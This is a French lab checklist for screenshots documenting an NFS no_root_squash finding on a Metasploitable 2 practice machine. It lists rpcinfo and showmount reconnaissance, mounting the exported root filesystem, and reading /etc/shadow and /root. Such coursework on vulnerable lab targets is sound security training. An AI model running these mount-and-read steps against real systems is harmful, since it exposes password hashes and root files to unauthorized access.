# Captures — NFS root export / no_root_squash (MS2, port 2049)

Cible : `192.168.56.101` · Kali : `192.168.56.1`.
2 captures. Chaque capture montre **la commande tapée ET son résultat**.

## 01-recon-showmount.png

Reconnaissance RPC puis liste des exports :
```bash
rpcinfo -p 192.168.56.101
showmount -e 192.168.56.101
```

Encadrer en rouge : la ligne `nfs` dans `rpcinfo`, et surtout l'export `/ *` renvoyé par
`showmount`.

## 02-mount-shadow.png

Montage puis preuve no_root_squash (déjà fournie) :
```bash
sudo mount -t nfs -o vers=3 192.168.56.101:/ /tmp/nfs_ms2
mount | grep nfs_ms2
sudo head -5 /tmp/nfs_ms2/etc/shadow
sudo ls -la /tmp/nfs_ms2/root
```

Encadrer en rouge : la ligne de montage `192.168.56.101:/ on /tmp/nfs_ms2 type nfs (rw,...)` et
la ligne `root:$1$...` de `/etc/shadow` (preuve de lecture root à distance).
